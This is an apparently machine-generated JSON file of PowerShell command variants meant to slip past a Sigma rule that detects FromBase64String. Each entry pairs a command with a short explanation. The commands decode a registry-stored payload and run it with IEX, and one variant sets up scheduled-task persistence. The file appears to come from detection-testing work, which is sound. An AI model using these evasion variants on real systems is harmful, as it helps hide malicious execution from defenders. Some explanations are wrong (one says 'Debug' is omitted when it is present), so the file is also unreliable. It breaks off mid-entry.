# output/groq_generator/rules/proc_creation_win_powershell_frombase64string.json
```json
[
  {
    "output": "\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion).Debug)))\"",
    "explanation": "This command omits the explicit registry key name 'Debug' and uses a shorter path by omitting the registry hive prefix, while still using the FromBase64String function. It maintains the same behavior as the original but may evade detection by slightly altering the string pattern."
  },
  {
    "output": "\"powershell.exe\" -Command \"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\"",
    "explanation": "This command uses the full namespace for [System.Text.Encoding] and [System.Convert] to avoid shorthand notations, which may not trigger the Sigma rule's string-based detection while maintaining the same functionality."
  },
  {
    "output": "\"C:\\WINDOWS\\system32\\cmd.EXE\" /c start /min \"\" powershell.exe -Command \"IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\"",
    "explanation": "This command uses double quotes around the PowerShell command and removes unnecessary spaces, making it slightly different in structure while preserving the same behavior and encoded payload execution."
  },
  {
    "output": "\"powershell.exe\" & { $Encoded = [Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test); IEX ([System.Text.Encoding]::ASCII.GetString($Encoded)) }",
    "explanation": "This command reorders the operations and stores the decoded string in a variable before executing it, which changes the string pattern and may bypass the rule's detection based on direct function call detection."
  },
  {
    "output": "\"cmd.exe\" /c reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45",
    "explanation": "This command uses a scheduled task to execute the encoded PowerShell command, which introduces additional obfuscation through task scheduling and may avoid direct detection of the FromBase64String function in the immediate command line."
  },
  {
    "output": "\"powershell.exe\" & { $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp
